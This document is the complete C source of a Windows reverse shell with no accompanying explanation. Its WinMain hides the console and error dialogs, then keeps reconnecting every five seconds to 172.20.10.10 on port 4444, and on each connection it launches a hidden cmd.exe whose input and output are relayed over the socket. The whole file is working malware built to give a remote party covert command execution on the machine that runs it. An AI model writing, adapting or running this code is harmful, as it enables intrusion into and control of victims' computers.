#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <ShlObj.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable: 28251)

DWORD WINAPI ReadFromCmd(LPVOID lpParam)
{
    SOCKET sockt = ((SOCKET*)lpParam)[0];
    HANDLE hStdOutRead = ((HANDLE*)lpParam)[1];

    char buffer[1024];
    DWORD bytesRead;

    while (true)
    {
        if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0)
        {
            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
            {
                send(sockt, buffer, bytesRead, 0);
            }
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI WriteToCmd(LPVOID lpParam)
{
    SOCKET sockt = ((SOCKET*)lpParam)[0];
    HANDLE hStdInWrite = ((HANDLE*)lpParam)[2];

    char buffer[1024];
    int recvSize;
    DWORD bytesWritten;

    while (true)
    {
        recvSize = recv(sockt, buffer, sizeof(buffer), 0);
        if (recvSize > 0)
        {
            WriteFile(hStdInWrite, buffer, recvSize, &bytesWritten, NULL);
        }
        else
        {
            break;
        }
        Sleep(10);
    }

    ExitProcess(0);
    return 0;
}

void SpawnShell(SOCKET sockt)
{
    HANDLE hStdInRead = NULL, hStdInWrite = NULL;
    HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
    CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    wchar_t cmd[] = L"cmd.exe";
    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    if (CreateProcessW(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, desktopPath, &si, &pi))
    {
        CloseHandle(hStdInRead);
        CloseHandle(hStdOutWrite);

        HANDLE handles[3] = { (HANDLE)sockt, hStdOutRead, hStdInWrite };

        CreateThread(NULL, 0, ReadFromCmd, handles, 0, NULL);
        CreateThread(NULL, 0, WriteToCmd, handles, 0, NULL);

        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hStdOutRead);
    CloseHandle(hStdInWrite);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX); // <-- Prevent error dialogs
    FreeConsole(); // <-- Hide console if it somehow spawns anyway

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    while (true)
    {
        SOCKET sockt = socket(AF_INET, SOCK_STREAM, 0);
        if (sockt == INVALID_SOCKET)
        {
            Sleep(5000);
            continue;
        }

        sockaddr_in revsockaddr = {};
        revsockaddr.sin_family = AF_INET;
        revsockaddr.sin_port = htons(4444);
        inet_pton(AF_INET, "172.20.10.10", &revsockaddr.sin_addr);

        if (connect(sockt, (sockaddr*)&revsockaddr, sizeof(revsockaddr)) == 0)
        {
            SpawnShell(sockt);
            closesocket(sockt);
        }
        else
        {
            closesocket(sockt);
            Sleep(5000); // wait 5 sec before retry
        }
    }

    WSACleanup();
    return 0;
}
